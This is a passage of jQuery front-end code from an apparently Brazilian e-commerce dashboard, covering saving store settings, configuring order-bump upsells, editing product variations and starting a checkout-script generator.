                            $("#tipo_checkout_loja_" + data.id_loja).append(
                                _global.optionSelectLayout
                            );
                            $("#tipo_checkout_loja_" + data.id_loja)
                                .val(data.cd_tipo_checkout)
                                .change();

                            _global.setAbaProdutos(data.id_loja);
                            _global.setAbaLojaModal(data.id_loja);
                            _global.geraQuillProduto(data.id_loja);
                            _global.adicionarProdutosManual(data.id_loja);
                            _global.geraScript(data.id_loja);
                            _global.adicionaVariacao(data.id_loja);
                            _global.orderBump(data.id_loja);

                            $("#btn_salva_" + data.id_loja).click(function (e) {
                                let thisbotao = $(this);
                                $(this).text("");
                                $(this).removeClass("btn-primary");
                                $(this).addClass("btn-success");
                                $(this).prop("disabled", true);
                                $(this).append(
                                    $("<div>", {
                                        class: "spinner-border text-white",
                                        role: "status",
                                        style: "width: 20px; height: 20px;",
                                    })
                                );
                                e.preventDefault();
                                var formData = new FormData();
                                formData.append(
                                    "imagem",
                                    $("#img_loja_" + data.id_loja)[0].files[0]
                                );
                                formData.append(
                                    "nm_loja",
                                    $("#nm_loja_" + data.id_loja).val()
                                );
                                formData.append(
                                    "cor_loja",
                                    $("#cor_loja_" + data.id_loja).val()
                                );
                                formData.append(
                                    "email_loja",
                                    $("#email_loja_" + data.id_loja).val()
                                );
                                formData.append(
                                    "cnpj_loja",
                                    $("#cnpj_loja_" + data.id_loja).val()
                                );
                                formData.append(
                                    "cd_tipo_checkout",
                                    $(
                                        "#tipo_checkout_loja_" + data.id_loja
                                    ).val()
                                );
                                formData.append("id_loja", data.id_loja);
                                // formData.append("")
                                const usuario = _global.getUsuario();

                                $.ajax({
                                    url: usuario.url_api + "updateLoja",
                                    type: "POST",
                                    data: formData,
                                    processData: false,
                                    contentType: false,
                                    headers: {
                                        Accept: "application/json",
                                        Authorization:
                                            "Bearer " + usuario.api_token,
                                    },
                                    success: function (retorno) {
                                        if (retorno.status == 200) {
                                            _global.toast(
                                                retorno.mensagem,
                                                "toastsucesso"
                                            );

                                            let pai = $(
                                                "#img_modal_" + retorno.id_loja
                                            ).parent();
                                            $(
                                                "#img_modal_" + retorno.id_loja
                                            ).remove();
                                            $(pai).append(
                                                $("<img>", {
                                                    src:
                                                        "http://" +
                                                        (retorno.img != null &&
                                                        retorno.img != undefined
                                                            ? retorno.img
                                                            : window.location
                                                                  .host +
                                                              "/logo/pergunta.png"),
                                                    id:
                                                        "img_modal_" +
                                                        retorno.id_loja,
                                                    class: "imgmodal",
                                                })
                                            );
                                        }
                                        if (retorno.status == 401) {
                                            _global.toast(
                                                retorno.mensagem,
                                                "toasterro"
                                            );
                                        }
                                        $(thisbotao).prop("disabled", false);
                                        $(thisbotao).empty();
                                        $(thisbotao).removeClass("btn-success");
                                        $(thisbotao).addClass("btn-primary");
                                        $(thisbotao).text("Salvar Informações");
                                    },
                                    error: function (
                                        jqXHR,
                                        textStatus,
                                        errorThrown
                                    ) {
                                        _global.toast(
                                            retorno.mensagem,
                                            "toasterro"
                                        );
                                        console.log(textStatus, errorThrown);
                                    },
                                });
                            });

                            $(".tab_loja").click(function (e) {
                                e.preventDefault();
                                e.stopPropagation();
                                e.stopImmediatePropagation();
                                let selecionada = $(e.currentTarget).attr(
                                    "aba"
                                );
                                $("#texto_loja_" + data.id_loja).text(
                                    $(this).attr("texto")
                                );

                                $(".tab_loja").each((index, data) => {
                                    if ($(data).attr("aba") != selecionada) {
                                        $(data).removeClass(
                                            "selected_tab_loja"
                                        );
                                    } else {
                                        $(data).addClass("selected_tab_loja");
                                    }
                                });

                                $(".divs_loja_" + data.id_loja).each(
                                    (index, data) => {
                                        if (
                                            $(data).attr("div") != selecionada
                                        ) {
                                            $(data).hide();
                                        } else {
                                            $(data).show();
                                        }
                                    }
                                );
                            });
                            _global.trocaAbaModalLoja(data.id_loja);
                        });
                    }
                },
                complete: () => {
                    _global.loadingAba("minhaslojas", false);
                    _global.bannerLoja();
                },
            });
        },
        orderBump(idloja) {
            $("#orderbump_" + idloja)
                .off("click")
                .on("click", async function (e) {
                    e.preventDefault();

                    let id = $("#grid_produtos_" + idloja).jqxGrid(
                        "getselectedrowindex"
                    );
                    let dados = $("#grid_produtos_" + idloja).jqxGrid(
                        "getrowdata",
                        id
                    );
                    let produto = dados.id_produto;

                    $("#orderbump_" + idloja).prop("disabled", true);
                    $("#adiciona_produto_" + idloja).prop("disabled", true);
                    $("#adiciona_variacao_" + idloja).prop("disabled", true);
                    $("#deleta_produto_" + idloja).prop("disabled", true);
                    $("#script_" + idloja).prop("disabled", true);
                    $("#importa_csv_loja_" + idloja).prop("disabled", true);

                    let req = await _global.busca(
                        "dashboard/getOrderBumpProduto",
                        {
                            p: produto,
                            l: idloja,
                        },
                        "POST"
                    );

                    const pai = $("#grid_produtos_" + idloja).parent();
                    $("#grid_produtos_" + idloja).hide();

                    $(pai).append(
                        $("<div>", {
                            id: "temp_orderbump",
                            class: "col-lg-12",
                        })
                            .append(
                                $("<div>", {
                                    class: "col-lg-12",
                                    style: "display: flex; justify-content: center;",
                                })
                                    .append(
                                        $("<button>", {
                                            text: "Voltar",
                                            class: "btn btn-success",
                                            id: "voltar_temp",
                                            style: "margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px;",
                                            click: function (e) {
                                                $("#temp_orderbump").remove();
                                                $("#orderbump_" + idloja).prop(
                                                    "disabled",
                                                    false
                                                );
                                                $(
                                                    "#adiciona_produto_" +
                                                        idloja
                                                ).prop("disabled", false);
                                                $(
                                                    "#adiciona_variacao_" +
                                                        idloja
                                                ).prop("disabled", false);
                                                $(
                                                    "#deleta_produto_" + idloja
                                                ).prop("disabled", false);
                                                $("#script_" + idloja).prop(
                                                    "disabled",
                                                    false
                                                );
                                                $(
                                                    "#importa_csv_loja_" +
                                                        idloja
                                                ).prop("disabled", false);
                                                $(
                                                    "#grid_produtos_" + idloja
                                                ).show();
                                            },
                                        }).append(
                                            $("<i>", {
                                                class: "ni ni-bold-left",
                                                style: "margin: 4px;",
                                            })
                                        )
                                    )
                                    .append(
                                        $("<button>", {
                                            class: "btn btn-danger",
                                            text: "Desativar Order Bump",
                                            style: "margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px;",
                                            click: function (e) {
                                                $("#select_orderbump")
                                                    .val("-1")
                                                    .change();
                                                $("#orderbump_valor")
                                                    .val(0.0)
                                                    .change();
                                                $("#tempsalvaorder").click();
                                            },
                                        })
                                    )
                            )
                            .append(
                                $("<div>", {
                                    class: "col-lg-12",
                                    style: "display: flex; justify-content: center;",
                                }).append(
                                    $("<div>", {
                                        class: "col-lg-12",
                                        style: "width: 50%; display: flex; justify-content: center; flex-direction: column;",
                                    })
                                        .append(
                                            $("<span>", {
                                                text: "Produto Atrelado ao Order Bump",
                                            })
                                        )
                                        .append(
                                            $("<select>", {
                                                class: "form-control",
                                                id: "select_orderbump",
                                            }).append(
                                                $("<option>", {
                                                    value: "-1",
                                                    text: "Nenhum",
                                                })
                                            )
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Valor do Acréscimo do Pedido",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "number",
                                                step: "0.01",
                                                min: "0",
                                                value: req.vl ?? "",
                                                max: "100000",
                                                placeholder:
                                                    "Valor, por ex: 19,90",
                                                id: "orderbump_valor",
                                                class: "form-control",
                                            })
                                        )
                                        .append(
                                            $("<button>", {
                                                class: "btn btn-primary",
                                                style: "width: 100%; margin-top: 10px;",
                                                text: "Salvar",
                                                id: "tempsalvaorder",
                                                i: idloja,
                                                p: produto,
                                                click: async function (e) {
                                                    if (
                                                        $(this).attr("p") ==
                                                        $(
                                                            "#select_orderbump"
                                                        ).val()
                                                    ) {
                                                        _global.toast(
                                                            "Você não pode atrelar o mesmo produto no Order Bump!",
                                                            "toasterro"
                                                        );
                                                        return;
                                                    }
                                                    _global.btnCarregando(
                                                        $(this),
                                                        true,
                                                        "Salvar"
                                                    );
                                                    let p = $(this).attr("p");
                                                    let o_p =
                                                        $(
                                                            "#select_orderbump"
                                                        ).val();
                                                    let o_vl =
                                                        $(
                                                            "#orderbump_valor"
                                                        ).val();

                                                    let req =
                                                        await _global.busca(
                                                            "dashboard/updateOrderBump",
                                                            {
                                                                p: p,
                                                                o_p: o_p,
                                                                o_vl: o_vl,
                                                            },
                                                            "POST"
                                                        );

                                                    if (req.status == 200) {
                                                        _global.toast(
                                                            "Os valores foram atualizados.",
                                                            "toastsucesso"
                                                        );
                                                        $(
                                                            "#voltar_temp"
                                                        ).click();
                                                    } else {
                                                        _global.toast(
                                                            "Houve um erro interno.",
                                                            "toasterro"
                                                        );
                                                    }
                                                    _global.btnCarregando(
                                                        $(this),
                                                        false,
                                                        "Salvar"
                                                    );
                                                },
                                            })
                                        )
                                )
                            )
                    );

                    if (req.produtos.length > 0) {
                        req.produtos.forEach((v, i) => {
                            $("#select_orderbump").append(
                                $("<option>", {
                                    value: v.cd_produto,
                                    text: v.ds_produto,
                                })
                            );
                        });
                    }

                    if (req.p == null) {
                        $("#select_orderbump").val("-1").change();
                    } else {
                        $("#select_orderbump").val(req.p).change();
                    }
                });
        },
        adicionaVariacao(idloja) {
            $("#adiciona_variacao_" + idloja)
                .off("click")
                .on("click", function (e) {
                    e.preventDefault();

                    let _id = $("#grid_produtos_" + idloja).jqxGrid(
                        "getselectedrowindex"
                    );

                    if (_id == undefined || _id == -1) {
                        _global.toast(
                            "Selecione um produto na tabela",
                            "toasterro"
                        );
                        return;
                    }

                    let dados = $("#grid_produtos_" + idloja).jqxGrid(
                        "getrowdata",
                        _id
                    );
                    let produto = dados.id_produto;

                    window.varTempProdutoAtual = produto;

                    const variacoes = {
                        variacao1: {
                            variacao: dados.variacao1,
                            opcao: dados.opcao1,
                        },
                        variacao2: {
                            variacao: dados.variacao2,
                            opcao: dados.opcao2,
                        },
                        variacao3: {
                            variacao: dados.variacao3,
                            opcao: dados.opcao3,
                        },
                    };

                    $("#grid_produtos_" + idloja)
                        .parent()
                        .hide();
                    $("#adiciona_produto_" + idloja).prop("disabled", true);
                    $("#adiciona_variacao_" + idloja).prop("disabled", true);
                    $("#deleta_produto_" + idloja).prop("disabled", true);
                    $("#script_" + idloja).prop("disabled", true);
                    $("#importa_csv_loja_" + idloja).prop("disabled", true);
                    $("#orderbump_" + idloja).prop("disabled", true);

                    for (i = 1; i <= 3; i++) {
                        let opt;
                        let _variacoes = "";
                        let titulo;
                        if (
                            variacoes["variacao" + i].variacao != null &&
                            variacoes["variacao" + i].opcao != null
                        ) {
                            titulo = variacoes["variacao" + i].variacao;
                            opt =
                                variacoes["variacao" + i].opcao.split("%flag%");
                            opt.pop();
                            opt.forEach((v, i) => {
                                _variacoes += v + ";";
                            });

                            _variacoes = _variacoes.slice(0, -1);
                        }
                        $("#grid_produtos_" + idloja)
                            .parent()
                            .parent()
                            .append(
                                $("<div>", {
                                    class: "col-lg-5 card tempvar",
                                    id: "temp_variacao" + i,
                                    style: "margin: 5px;",
                                }).append(
                                    $("<div>", {
                                        style: "display: flex; justify-content: center; align-items: center; flex-direction: column;",
                                        class: "margin5",
                                    })
                                        .append(
                                            $("<span>", {
                                                text: "Variação " + i,
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Título",
                                                style: "font-size: 14px;",
                                            })
                                        )
                                        .append(
                                            $("<input>", {
                                                type: "text",
                                                class: "form-control",
                                                value: titulo ?? "",
                                                id: "titulo_" + i,
                                            })
                                        )
                                        .append(
                                            $("<span>", {
                                                text: "Opções",
                                                style: "font-size: 14px;",
                                            })
                                        )
                                        .append(
                                            $("<button>", {
                                                class: "btn btn-success width100",
                                                text: "Opções da Variação",
                                                i: i,
                                                l: idloja,
                                                click: async function (e) {
                                                    if (
                                                        $(
                                                            "#titulo_" +
                                                                $(this).attr(
                                                                    "i"
                                                                )
                                                        ).val() == ""
                                                    ) {
                                                        _global.toast(
                                                            "Digite um título para a variação!",
                                                            "toastwarning"
                                                        );
                                                        return;
                                                    }

                                                    window.varTempTitulo = $(
                                                        "#titulo_" +
                                                            $(this).attr("i")
                                                    ).val();
                                                    window.varTempNumero =
                                                        $(this).attr("i");

                                                    let _i = $(this).attr("i");
                                                    $(this).prop(
                                                        "disabled",
                                                        true
                                                    );
                                                    let dados =
                                                        await _global.busca(
                                                            "dashboard/getProdutosVariacao",
                                                            {
                                                                id_loja: idloja,
                                                                i: _i,
                                                                p: produto,
                                                            },
                                                            "POST"
                                                        );

                                                    $(this).prop(
                                                        "disabled",
                                                        false
                                                    );

                                                    $(".tempvar").each(
                                                        (i, v) => {
                                                            $(v).hide();
                                                        }
                                                    );

                                                    $(
                                                        "#divinfovariacao"
                                                    ).hide();
                                                    $(
                                                        "#btn_voltar_variacao"
                                                    ).hide();
                                                    $(
                                                        "#grid_produtos_" +
                                                            idloja
                                                    )
                                                        .parent()
                                                        .parent()
                                                        .append(
                                                            $("<div>", {
                                                                class: "col-lg-12",
                                                                id: "divopcoes_var",
                                                            }).append(
                                                                $("<div>", {
                                                                    style: "display: flex; justify-content: center;",
                                                                })
                                                                    .append(
                                                                        $(
                                                                            "<button>",
                                                                            {
                                                                                text: "Voltar",
                                                                                class: "btn btn-success",
                                                                                id: "voltar_temp",
                                                                                style: "margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px;",
                                                                                click: function (
                                                                                    e
                                                                                ) {
                                                                                    e.preventDefault();
                                                                                    $(
                                                                                        ".tempvar"
                                                                                    ).each(
                                                                                        (
                                                                                            i,
                                                                                            v
                                                                                        ) => {
                                                                                            $(
                                                                                                v
                                                                                            ).show();
                                                                                        }
                                                                                    );
                                                                                    $(
                                                                                        "#divinfovariacao"
                                                                                    ).show();
                                                                                    $(
                                                                                        "#btn_voltar_variacao"
                                                                                    ).show();
                                                                                    $(
                                                                                        "#voltar_temp"
                                                                                    ).remove();
                                                                                    $(
                                                                                        "#divopcoes_var"
                                                                                    ).remove();
                                                                                    $(
                                                                                        "#divopcoes_var"
                                                                                    ).remove();
                                                                                },
                                                                            }
                                                                        ).append(
                                                                            $(
                                                                                "<i>",
                                                                                {
                                                                                    class: "ni ni-bold-left",
                                                                                    style: "margin: 4px;",
                                                                                }
                                                                            )
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<button>",
                                                                            {
                                                                                class: "btn btn-primary",
                                                                                style: "width: 83px; margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px; text-align: center;",
                                                                                text: "Salvar",
                                                                                click: async function (
                                                                                    e
                                                                                ) {
                                                                                    let _flag = false;

                                                                                    if (
                                                                                        $(
                                                                                            ".opcaotemporaria"
                                                                                        )
                                                                                            .length ==
                                                                                        0
                                                                                    ) {
                                                                                        _global.toast(
                                                                                            "Adicione alguma variação.",
                                                                                            "toasterro"
                                                                                        );
                                                                                        return;
                                                                                    }

                                                                                    let _this =
                                                                                        $(
                                                                                            this
                                                                                        );

                                                                                    _global.btnCarregando(
                                                                                        _this,
                                                                                        true,
                                                                                        "Salvar"
                                                                                    );

                                                                                    let aux = 0;
                                                                                    $(
                                                                                        ".opcaotemporaria"
                                                                                    ).each(
                                                                                        (
                                                                                            i,
                                                                                            v
                                                                                        ) => {
                                                                                            if (
                                                                                                $(
                                                                                                    v
                                                                                                )
                                                                                                    .find(
                                                                                                        "input"
                                                                                                    )
                                                                                                    .val() ==
                                                                                                ""
                                                                                            ) {
                                                                                                aux++;
                                                                                                _flag = true;
                                                                                            }
                                                                                        }
                                                                                    );

                                                                                    if (
                                                                                        _flag
                                                                                    ) {
                                                                                        _global.toast(
                                                                                            "Existem " +
                                                                                                aux +
                                                                                                " variações sem título p/ opção.",
                                                                                            "toasterro"
                                                                                        );
                                                                                        return;
                                                                                    }

                                                                                    let l =
                                                                                        [];
                                                                                    $(
                                                                                        ".opcaotemporaria"
                                                                                    ).each(
                                                                                        (
                                                                                            i,
                                                                                            v
                                                                                        ) => {
                                                                                            l.push(
                                                                                                {
                                                                                                    opcao: $(
                                                                                                        v
                                                                                                    )
                                                                                                        .find(
                                                                                                            "input"
                                                                                                        )
                                                                                                        .val(),
                                                                                                    produto:
                                                                                                        $(
                                                                                                            v
                                                                                                        )
                                                                                                            .find(
                                                                                                                "select"
                                                                                                            )
                                                                                                            .val(),
                                                                                                }
                                                                                            );
                                                                                        }
                                                                                    );

                                                                                    let string_titulo =
                                                                                        "";
                                                                                    let string_produto =
                                                                                        "";

                                                                                    l.forEach(
                                                                                        (
                                                                                            v,
                                                                                            i
                                                                                        ) => {
                                                                                            string_titulo += `${v.opcao}%flag%`;
                                                                                            string_produto += `${v.produto}%flag%`;
                                                                                        }
                                                                                    );

                                                                                    let busca =
                                                                                        async function () {
                                                                                            return new Promise(
                                                                                                (
                                                                                                    res
                                                                                                ) => {
                                                                                                    let dados =
                                                                                                        _global.busca(
                                                                                                            "dashboard/salvaVariacaoNovo",
                                                                                                            {
                                                                                                                i: window.varTempNumero,
                                                                                                                titulo: window.varTempTitulo,
                                                                                                                variacao:
                                                                                                                    string_titulo,
                                                                                                                produto:
                                                                                                                    string_produto,
                                                                                                                p: window.varTempProdutoAtual,
                                                                                                            },
                                                                                                            "POST"
                                                                                                        );

                                                                                                    res(
                                                                                                        dados
                                                                                                    );
                                                                                                }
                                                                                            );
                                                                                        };

                                                                                    busca().then(
                                                                                        (
                                                                                            dados
                                                                                        ) => {
                                                                                            if (
                                                                                                dados.status ==
                                                                                                200
                                                                                            ) {
                                                                                                _global.toast(
                                                                                                    "As informações foram salvas com sucesso.",
                                                                                                    "toastsucesso"
                                                                                                );
                                                                                                $(
                                                                                                    "#voltar_temp"
                                                                                                ).click();
                                                                                            } else {
                                                                                                _global.toast(
                                                                                                    "Não foi possível salvar as informações",
                                                                                                    "toasterro"
                                                                                                );
                                                                                            }
                                                                                            _global.btnCarregando(
                                                                                                _this,
                                                                                                false,
                                                                                                "Salvar"
                                                                                            );
                                                                                        }
                                                                                    );
                                                                                },
                                                                            }
                                                                        )
                                                                    )
                                                            )
                                                        );

                                                    $("#divopcoes_var").append(
                                                        $("<div>", {
                                                            id: "divopcoes_var",
                                                            class: "flex",
                                                        })
                                                    );

                                                    window.tempVariacao = null;
                                                    if (dados.produtos != null)
                                                        window.tempVariacao =
                                                            dados.produtos;
                                                    dados.variacao.forEach(
                                                        (v, i) => {
                                                            $(
                                                                "#divopcoes_var"
                                                            ).append(
                                                                $("<div>", {
                                                                    class: "col-lg-3 card flex margin5 opcaotemporaria",
                                                                    style: "justify-content: center; align-items: center;",
                                                                })
                                                                    .append(
                                                                        $(
                                                                            "<button>",
                                                                            {
                                                                                class: "btn btn-danger",
                                                                                style: "border-radius: 30px; font-size: 10px; margin: 5px; font-size: 22px; height: 22px; width: 12px; display: flex; justify-content: center; align-items: center;",
                                                                                click: function (
                                                                                    e
                                                                                ) {
                                                                                    $(
                                                                                        this
                                                                                    )
                                                                                        .parent()
                                                                                        .remove();
                                                                                },
                                                                            }
                                                                        ).append(
                                                                            $(
                                                                                "<i>",
                                                                                {
                                                                                    class: "ni ni-fat-remove",
                                                                                }
                                                                            )
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<span>",
                                                                            {
                                                                                text: "Opção",
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<input>",
                                                                            {
                                                                                class: "form-control",
                                                                                type: "text",
                                                                                id:
                                                                                    "input_opcao" +
                                                                                    i,
                                                                                value: v,
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<span>",
                                                                            {
                                                                                text: "Produto Atrelado",
                                                                            }
                                                                        )
                                                                    )
                                                                    .append(
                                                                        $(
                                                                            "<select>",
                                                                            {
                                                                                id:
                                                                                    "select_opcao" +
                                                                                    i,
                                                                                class: "form-control",
                                                                            }
                                                                        )
                                                                    )
                                                            );

                                                            if (
                                                                dados.produtos !=
                                                                null
                                                            ) {
                                                                window.tempVariacao =
                                                                    dados.produtos;
                                                                dados.produtos.forEach(
                                                                    (
                                                                        _v,
                                                                        _i
                                                                    ) => {
                                                                        $(
                                                                            "#select_opcao" +
                                                                                i
                                                                        ).append(
                                                                            $(
                                                                                "<option>",
                                                                                {
                                                                                    text: _v.ds_produto,
                                                                                    value: _v.id_produto,
                                                                                }
                                                                            )
                                                                        );
                                                                    }
                                                                );
                                                                if (
                                                                    dados.pvar !=
                                                                    null
                                                                ) {
                                                                    if (
                                                                        dados
                                                                            .pvar[
                                                                            i
                                                                        ] !=
                                                                            undefined &&
                                                                        dados
                                                                            .pvar[
                                                                            i
                                                                        ] !=
                                                                            null &&
                                                                        dados
                                                                            .pvar[
                                                                            i
                                                                        ] !=
                                                                            "-1"
                                                                    ) {
                                                                        $(
                                                                            "#select_opcao" +
                                                                                i
                                                                        )
                                                                            .val(
                                                                                dados
                                                                                    .pvar[
                                                                                    i
                                                                                ]
                                                                            )
                                                                            .change();
                                                                    }
                                                                } else {
                                                                    $(
                                                                        "#select_opcao" +
                                                                            i
                                                                    ).append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                text: "Nenhum",
                                                                                value: "-1",
                                                                            }
                                                                        )
                                                                    );

                                                                    $(
                                                                        "#select_opcao" +
                                                                            i
                                                                    )
                                                                        .val(
                                                                            "-1"
                                                                        )
                                                                        .change();
                                                                }
                                                            }
                                                        }
                                                    );

                                                    $("#divopcoes_var").append(
                                                        $("<div>", {
                                                            class: "col-lg-2 flex",
                                                            style: "justify-content: center; align-items: center",
                                                            id: "add_opcao_temp",
                                                        }).append(
                                                            $("<button>", {
                                                                class: "btn btn-success",
                                                                style: "border-radius: 30px; width: 45px; display: flex; justify-content: center; margin-top: 10px;",
                                                                click: function (
                                                                    e
                                                                ) {
                                                                    e.preventDefault();
                                                                    let vl =
                                                                        Date.now();
                                                                    $("<div>", {
                                                                        class: "col-lg-3 card flex margin-5 opcaotemporaria",
                                                                        style: "justify-content: center; align-items: center; margin-top: 10px",
                                                                    })
                                                                        .append(
                                                                            $(
                                                                                "<button>",
                                                                                {
                                                                                    class: "btn btn-danger",
                                                                                    style: "border-radius: 30px; font-size: 10px; margin: 5px; font-size: 22px; height: 22px; width: 12px; display: flex; justify-content: center; align-items: center;",
                                                                                    click: function (
                                                                                        e
                                                                                    ) {
                                                                                        $(
                                                                                            this
                                                                                        )
                                                                                            .parent()
                                                                                            .remove();
                                                                                    },
                                                                                }
                                                                            ).append(
                                                                                $(
                                                                                    "<i>",
                                                                                    {
                                                                                        class: "ni ni-fat-remove",
                                                                                    }
                                                                                )
                                                                            )
                                                                        )
                                                                        .append(
                                                                            $(
                                                                                "<span>",
                                                                                {
                                                                                    text: "Opção",
                                                                                }
                                                                            )
                                                                        )
                                                                        .append(
                                                                            $(
                                                                                "<input>",
                                                                                {
                                                                                    class: "form-control",
                                                                                    placeholder:
                                                                                        "Ex: 110v",
                                                                                    id:
                                                                                        "input_opcao" +
                                                                                        vl,
                                                                                }
                                                                            )
                                                                        )
                                                                        .append(
                                                                            $(
                                                                                "<span>",
                                                                                {
                                                                                    text: "Produto Atrelado",
                                                                                }
                                                                            )
                                                                        )
                                                                        .append(
                                                                            $(
                                                                                "<select>",
                                                                                {
                                                                                    id:
                                                                                        "select_opcao" +
                                                                                        vl,
                                                                                    class: "form-control",
                                                                                }
                                                                            )
                                                                        )
                                                                        .insertBefore(
                                                                            $(
                                                                                "#add_opcao_temp"
                                                                            )
                                                                        );

                                                                    window.tempVariacao.forEach(
                                                                        (
                                                                            v,
                                                                            i
                                                                        ) => {
                                                                            $(
                                                                                "#select_opcao" +
                                                                                    vl
                                                                            ).append(
                                                                                $(
                                                                                    "<option>",
                                                                                    {
                                                                                        text: v.ds_produto,
                                                                                        value: v.id_produto,
                                                                                    }
                                                                                )
                                                                            );
                                                                        }
                                                                    );

                                                                    $(
                                                                        "#select_opcao" +
                                                                            vl
                                                                    ).append(
                                                                        $(
                                                                            "<option>",
                                                                            {
                                                                                text: "Nenhum",
                                                                                value: "-1",
                                                                            }
                                                                        )
                                                                    );
                                                                    $(
                                                                        "#select_opcao" +
                                                                            vl
                                                                    )
                                                                        .val(
                                                                            "-1"
                                                                        )
                                                                        .change();
                                                                },
                                                            }).append(
                                                                $("<i>", {
                                                                    class: "ni ni-fat-add",
                                                                    style: "font-size: 20px;",
                                                                })
                                                            )
                                                        )
                                                    );
                                                },
                                                type: "text",
                                                id: "opcoes_" + i,
                                            })
                                        )
                                )
                            );
                    }

                    $(".salvavariacao").click(function (e) {
                        e.preventDefault();
                        let i = $(this).attr("i");
                        let _this = $(this);

                        _global.btnCarregando($(_this), true, "Salvar");
                        if ($("#titulo_" + i).val() == "") {
                            _global.toast(
                                "Digite um título à variação.",
                                "toastwarning"
                            );
                            return;
                        }

                        if ($("#opcoes_" + i).val() == "") {
                            _global.toast(
                                "Digite as variações.",
                                "toastwarning"
                            );
                            return;
                        }

                        if (
                            !$("#opcoes_" + i)
                                .val()
                                .includes(";")
                        ) {
                            _global.toast(
                                "Verifique as opções, o delimitador deve ser ;",
                                "toasterro"
                            );
                            return;
                        }
                        let valor = $("#opcoes_" + i).val();
                        let verifica = valor.split(";");

                        if (verifica.length == 2) {
                            if (verifica[1] == "") {
                                _global.toast(
                                    "É necessário ter no mínimo duas variações, verifique suas opções.",
                                    "toasterro"
                                );
                            }
                        }

                        valor = $("#opcoes_" + i).val();
                        let titulo = $("#titulo_" + i).val();
                        let conectar;
                        const conecta = async function () {
                            conectar = await _global.busca(
                                "dashboard/salvaVariacao",
                                {
                                    a1: "variacao" + i,
                                    a2: titulo,
                                    b1: "opcao" + i,
                                    b2: valor,
                                    idloja: idloja,
                                    p: produto,
                                },
                                "POST"
                            );
                        };

                        conecta().then(() => {
                            if (conectar.status == 200) {
                                _global.minhasLojas();
                                _global.toast(
                                    "As variações foram salvas com sucesso.",
                                    "toastsucesso"
                                );
                            } else {
                                _global.toast(
                                    "Houve um erro ao salvar as variações",
                                    "toasterro"
                                );
                            }

                            _global.btnCarregando($(_this), false, "Salvar");
                        });
                    });
                    $("#grid_produtos_" + idloja)
                        .parent()
                        .parent()
                        .prepend(
                            $("<div>", {
                                class: "col-lg-12",
                                id: "btn_voltar_variacao",
                            }).append(
                                $("<div>", {
                                    style: "display: flex; justify-content: center;",
                                }).append(
                                    $("<button>", {
                                        text: "Voltar",
                                        class: "btn btn-success",
                                        style: "margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px;",
                                        click: function (e) {
                                            e.preventDefault();
                                            for (i = 1; i <= 3; i++) {
                                                $(
                                                    "#temp_variacao" + i
                                                ).remove();
                                            }
                                            $("#btn_voltar_variacao").remove();
                                            $("#divinfovariacao").remove();
                                            $(
                                                "#adiciona_produto_" + idloja
                                            ).prop("disabled", false);
                                            $("#orderbump_" + idloja).prop(
                                                "disabled",
                                                false
                                            );
                                            $(
                                                "#adiciona_variacao_" + idloja
                                            ).prop("disabled", false);
                                            $("#deleta_produto_" + idloja).prop(
                                                "disabled",
                                                false
                                            );
                                            $("#script_" + idloja).prop(
                                                "disabled",
                                                false
                                            );
                                            $(
                                                "#importa_csv_loja_" + idloja
                                            ).prop("disabled", false);
                                            $("#grid_produtos_" + idloja)
                                                .parent()
                                                .show();
                                        },
                                    }).append(
                                        $("<i>", {
                                            class: "ni ni-bold-left",
                                            style: "margin: 4px;",
                                        })
                                    )
                                )
                            )
                        );
                });
        },
        geraScript(idloja) {
            $("#script_" + idloja)
                .off("click")
                .on("click", async function (e) {
                    e.preventDefault();
                    const usuario = _global.getUsuario();
                    let _dados = await _global.busca(
                        "dashboard/getDominioCheckout",
                        {
                            id_usuario: usuario.id_usuario,
                        },
                        "POST"
                    );

                    let _id = $("#grid_produtos_" + idloja).jqxGrid(
                        "getselectedrowindex"
                    );

                    if (_id == undefined || _id == -1) {
                        _global.toast(
                            "Selecione um produto na tabela",
                            "toasterro"
                        );
                        return;
                    }
                    $("#grid_produtos_" + idloja)
                        .parent()
                        .hide();
                    $("#adiciona_produto_" + idloja).prop("disabled", true);
                    $("#adiciona_variacao_" + idloja).prop("disabled", true);
                    $("#orderbump_" + idloja).prop("disabled", true);
                    $("#deleta_produto_" + idloja).prop("disabled", true);
                    $("#script_" + idloja).prop("disabled", true);
                    $("#importa_csv_loja_" + idloja).prop("disabled", true);

                    let dados = $("#grid_produtos_" + idloja).jqxGrid(
                        "getrowdata",
                        _id
                    );

                    $("#grid_produtos_" + idloja)
                        .parent()
                        .parent()
                        .append(
                            $("<div>", {
                                class: "col-lg-12 card",
                                id: "temp_script_" + idloja,
                                style: "display: flex; justify-content: center; align-items: center;",
                            })
                                .append(
                                    $("<div>", {
                                        style: "display: flex;",
                                    })
                                        .append(
                                            $("<button>", {
                                                text: "Voltar",
                                                class: "btn btn-success",
                                                style: "margin: 5px; display: flex; border-radius: 25px; height: 40px; margin-top: 10px; margin-right: 10px;",
                                                click: function (e) {
                                                    e.preventDefault();
                                                    $(
                                                        "#temp_script_" + idloja
                                                    ).remove();
                                                    $(
                                                        "#grid_produtos_" +
                                                            idloja
                                                    )
                                                        .parent()
                                                        .show();
                                                    $(
                                                        "#adiciona_produto_" +
                                                            idloja
                                                    ).prop("disabled", false);
                                                    $(
                                                        "#adiciona_variacao_" +
                                                            idloja
                                                    ).prop("disabled", false);
                                                    $(
                                                        "#deleta_produto_" +
                                                            idloja
                                                    ).prop("disabled", false);
                                                    $("#script_" + idloja).prop(
                                                        "disabled",
                                                        false
                                                    );
                                                    $(
                                                        "#orderbump_" + idloja
                                                    ).prop("disabled", false);
                                                    $(
                                                        "#importa_csv_loja_" +
                                                            idloja
                                                    ).prop("disabled", false);
                                                },
                                            }).append(
